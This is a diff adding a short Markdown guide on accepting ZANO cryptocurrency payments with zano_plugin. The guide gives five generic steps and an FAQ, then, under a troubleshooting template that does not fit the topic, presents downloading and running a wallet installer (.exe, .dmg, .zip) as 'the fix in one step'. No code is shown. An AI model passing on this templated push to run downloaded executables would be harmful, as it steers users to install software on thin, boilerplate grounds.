@@ -1,0 +1,77 @@
+<p align="center"><img src="https://raw.githubusercontent.com/zano-projects/Zano-Wallet/main/learn/assets/01-zano-wallet-brand.webp" alt="Zano Wallet - Accept ZANO Payments With zano_plugin" width="100%"></p>
+
+<h1 align="center">Accept ZANO Payments With zano_plugin</h1>
+
+<p align="center">
+<a href="https://zanowallet.io/"><img src="https://img.shields.io/badge/Website-zanowallet.io-7c5cff?style=for-the-badge" alt="Zano Wallet website"></a>
+<a href="https://github.com/zano-projects/Zano-Wallet/releases/tag/v2.0.4"><img src="https://img.shields.io/badge/Release-v2.0.4-1f2a6b?style=for-the-badge" alt="Zano Wallet v2.0.4 release"></a>
+<a href="https://github.com/zano-projects/Zano-Wallet/tree/main/learn"><img src="https://img.shields.io/badge/Guides-Zano%20Wallet%20Learn-3b2a8f?style=for-the-badge" alt="Zano Wallet guides"></a>
+</p>
+
+---
+
+**Short answer:** Use zano_plugin to connect a store to a Zano Wallet so customers can pay privately in ZANO.
+
+## You'll see this if
+
+- You run an online shop
+- You want private payments
+
+## Why it happens
+
+Merchants need payment detection without exposing customer data.
+
+## How to fix it
+
+1. Run Zano Wallet with RPC enabled.
+2. Install zano_plugin in your store.
+3. Configure the wallet connection.
+4. Test with a small payment.
+5. Go live and monitor orders.
+
+Related reading: [Validate a Zano Address Before Sending](./validate-zano-address.md) and the [what is Zano](https://zanowallet.io/what-is-zano/).
+
+## If that didn't work
+
+If payments do not register, check RPC settings and wallet sync. You can also read [How to Receive ZANO in Your Wallet](./receive-zano.md).
+
+## Prevent it next time
+
+Keep the merchant wallet backed up and updated. More on the website: [confidential assets](https://zanowallet.io/features/confidential-assets/).
+
+## FAQ
+
+**Do customers need Zano Wallet?**  
+They need any wallet that can send ZANO.
+
+**Are payments private?**  
+Yes, Zano hides amounts and parties.
+
+---
+
+## The fix in one step: install the latest Zano Wallet
+
+The current release, **Zano Wallet v2.0.4**, includes the latest fixes. Download it from the [tagged release](https://github.com/zano-projects/Zano-Wallet/releases/tag/v2.0.4):
+
+[![Download Zano Wallet for Windows](https://img.shields.io/badge/Download-Windows-0078D6?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/zano-projects/Zano-Wallet/releases/download/v2.0.4/zano-wallet-2.0.4-installer.exe) [![Download Zano Wallet for macOS](https://img.shields.io/badge/Download-macOS-111111?style=for-the-badge&logo=apple&logoColor=white)](https://github.com/zano-projects/Zano-Wallet/releases/download/v2.0.4/zano-wallet-2.0.4.dmg) [![Download Zano Wallet for Linux](https://img.shields.io/badge/Download-Linux-E95420?style=for-the-badge&logo=linux&logoColor=white)](https://github.com/zano-projects/Zano-Wallet/releases/download/v2.0.4/zano-wallet-2.0.4.zip)
+
+| Platform | File | Version |
+|---|---|---|
+| Windows | [zano-wallet-2.0.4-installer.exe](https://github.com/zano-projects/Zano-Wallet/releases/download/v2.0.4/zano-wallet-2.0.4-installer.exe) | v2.0.4 |
+| macOS | [zano-wallet-2.0.4.dmg](https://github.com/zano-projects/Zano-Wallet/releases/download/v2.0.4/zano-wallet-2.0.4.dmg) | v2.0.4 |
+| Linux | [zano-wallet-2.0.4.zip](https://github.com/zano-projects/Zano-Wallet/releases/download/v2.0.4/zano-wallet-2.0.4.zip) | v2.0.4 |
+
+> [!TIP]
+> Compare the SHA-256 with the table on the [release page](https://github.com/zano-projects/Zano-Wallet/releases/tag/v2.0.4) before running the installer.
+
+## Related guides
+
+| Guide | On the website |
+|---|---|
+| [Validate a Zano Address Before Sending](./validate-zano-address.md) | [what is Zano](https://zanowallet.io/what-is-zano/) |
+| [How to Receive ZANO in Your Wallet](./receive-zano.md) | [confidential assets](https://zanowallet.io/features/confidential-assets/) |
+| [Zano Confidential Assets Explained](./zano-confidential-assets.md) | [download Zano Wallet](https://zanowallet.io/download/) |
+
+---
+
+<p align="center"><a href="https://zanowallet.io/">zanowallet.io</a> · <a href="https://github.com/zano-projects/Zano-Wallet/releases/tag/v2.0.4">Release v2.0.4</a> · <a href="https://github.com/zano-projects/Zano-Wallet/tree/main/learn">All guides</a></p>
